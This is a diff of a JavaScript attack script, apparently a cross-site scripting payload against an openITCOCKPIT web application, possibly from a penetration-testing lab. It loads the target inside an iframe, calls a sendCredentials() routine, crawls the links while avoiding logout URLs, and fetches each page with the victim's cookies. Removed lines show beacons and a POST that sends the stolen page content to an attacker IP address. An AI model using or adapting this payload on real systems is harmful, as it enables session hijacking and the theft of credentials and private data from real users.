@@ -1,20 +1,3 @@
-/*Create header files for the body
- * */
-//var header = document.createElement("head");
-//
-//var jquery_script = document.createElement("script");
-//jquery_script.setAttribute("src": "/frontend/js/lib/jquery.min.js?3.7.2");
-//jquery_script.setAttribute("type": "text/javascript");
-//header.appendChilde(jquery_script);
-//
-//var obj = document.body;
-//obj.appendChild(header);
-//var element = document.createElement("h1");
-//var text = document.createTextNode("Francis");
-//element.appendChild(text);
-//obj.appendChild(element);
-
-
 var inner = `
 <head>
     <!--[if IE]>
@@ -133,25 +116,20 @@ var inner = `
 
 function validUrl(url){
 	//This function will check to see if a URL is valid
-	var urlPattern = new RegExp('^(https?:\\/\\/)?' + //protocol
-		'(' +
-			'(' +
-				'([a-z\\d]([a-z\\d-]*[a-z\\d])*)|' + //domain name
-				'((\\d{1,3}\\.){1,3}\\d{1,3})' +     //OR ip (v4) address
-			')' +
-			'(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*' + 	     //port and path
-			'(\\?[;&a-z\\d%_.~+=-]*)?' +		     //query string
-			'(\\#[-a-z\\d]*)?$' +		             //fragment locator
-		')',
+	var urlPattern = new RegExp('^(https?:\\/\\/)?' + // protocol
+		'((([a-z\\d]([a-z\\d-]*[a-z\\d])*))|' + // domain name
+		'((\\d{1,3}\\.){3}\\d{1,3}))' + // OR ip (v4) address
+		'(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*' + // port and path
+		'(\\?[;&a-z\\d%_.~+=-]*)?' + // query string
+		'(\\#[-a-z\\d_]*)?$', 'i'); // fragment locator
 
-	'i');
-
+	//Defining the logout pattern
 	var logoutPattern = new RegExp('logout|signout|log-out|sign-out')
-	var ret = false;
 
-	if (!!urlPattern.test(url) && !logoutPattern.test(url.toLowerCase())){
+	//if valid URL and does not contain logout
+	if (!!urlPattern.test(url) && !logoutPattern.test(url.toLowerCase())) {
 		return true
-	}else{
+	} else {
 		return false
 	}
 
@@ -160,16 +138,13 @@ async function getContent(){
 	//This function will be called by the actions() function
 	//await fetch("https://192.168.119.137:443/hello", {method: "GET"});
 	await sendCredentials()
-	await fetch("https://192.168.119.137:443/hello", {method:"GET"});
 	allHrefs = [];
-	allA = document.getElementsByTagName("a");
+	allA = iframe.contentDocument.getElementsByTagName("a");
 	for(const element of allA){
 		allHrefs.push(element.href);
 	}
 
 	uniqueHrefs = _.unique(allHrefs);
-
-	await fetch("https://192.168.119.137:443/hello", {method:"GET"});
 
 	var validUrls = [];
 	for(const elem of uniqueHrefs){
@@ -178,11 +153,8 @@ async function getContent(){
 		}
 	}
 
-
-	await fetch("https://192.168.119.137:443/hello", {method:"GET"});
-
 	for(let i = 0; i < validUrls.length; i++){
-		var response = await fetch("https://openitcockpit", {
+		var response = await fetch(validUrls[i], {
 			credentials: "include",
 			method: "GET"
 		});
@@ -198,26 +170,6 @@ async function getContent(){
 
 	}
 
-	/*
-	validUrls.forEach( async href => {
-		var response = await fetch("https://openitcockpit", {
-			credentials: "include",
-			method: "GET"
-		});
-
-		await fetch("https://192.168.119.137:443/content", {
-			body:"location=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(await response.text()),
-			headers: {
-				"Content-Type": "application/x-www-form-urlencoded"
-			},
-			method: "POST"
-		});
-
-	});
-	*/
-	console.log("test");
-
-	await fetch("https://192.168.119.137:443/hello", {method:"GET"});
 }
 
 async function sendCredentials(){
